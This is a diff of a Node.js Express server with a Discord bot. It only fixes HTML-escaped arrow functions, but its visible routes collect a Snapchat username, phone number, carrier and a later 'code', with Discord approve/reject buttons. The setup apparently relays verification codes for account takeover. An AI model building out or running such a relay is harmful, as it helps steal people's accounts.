@@ -24,7 +24,7 @@ const PORT = process.env.PORT || 3000;
 // ================== ROUTES EXPRESS ==================
 
 // 1. Soumission des infos (étape 1)
-app.post('/api/submit', async (req, res) =&gt; {
+app.post('/api/submit', async (req, res) => {
     const { snapchat, phone, operator } = req.body;
     if (!snapchat || !phone || !operator) {
         return res.status(400).json({ error: 'Champs manquants' });
@@ -67,7 +67,7 @@ app.post('/api/submit', async (req, res) =&gt; {
 });
 
 // 2. Vérification d’un pseudo Snapchat (via endpoint public)
-app.get('/api/check-snapchat/:username', async (req, res) =&gt; {
+app.get('/api/check-snapchat/:username', async (req, res) => {
     const username = req.params.username.trim();
     if (!username) return res.status(400).json({ error: 'Pseudo requis' });
 
@@ -101,7 +101,7 @@ app.get('/api/check-snapchat/:username', async (req, res) =&gt; {
 });
 
 // 3. Statut d'une demande (polling)
-app.get('/api/status/:id', (req, res) =&gt; {
+app.get('/api/status/:id', (req, res) => {
     const request = requests.get(req.params.id);
     if (!request) return res.status(404).json({ error: 'Demande introuvable' });
     res.json({
@@ -112,7 +112,7 @@ app.get('/api/status/:id', (req, res) =&gt; {
 });
 
 // 4. Code reçu
-app.post('/api/code', async (req, res) =&gt; {
+app.post('/api/code', async (req, res) => {
     const { id, code } = req.body;
     if (!id || !code) return res.status(400).json({ error: 'Champs manquants' });
     const request = requests.get(id);
@@ -140,7 +140,7 @@ app.post('/api/code', async (req, res) =&gt; {
 });
 
 // --- Interactions Discord (boutons) ---
-client.on('interactionCreate', async interaction =&gt; {
+client.on('interactionCreate', async interaction => {
     if (!interaction.isButton()) return;
     const [action, requestId] = interaction.customId.split('_');
     if (action !== 'approve' && action !== 'reject') return;
@@ -160,12 +160,12 @@ client.on('interactionCreate', async interaction =&gt; {
 });
 
 // --- Démarrage ---
-client.once('ready', () =&gt; {
+client.once('ready', () => {
     console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
 });
 
 client.login(process.env.DISCORD_BOT_TOKEN);
 
-app.listen(PORT, () =&gt; {
+app.listen(PORT, () => {
     console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
 });
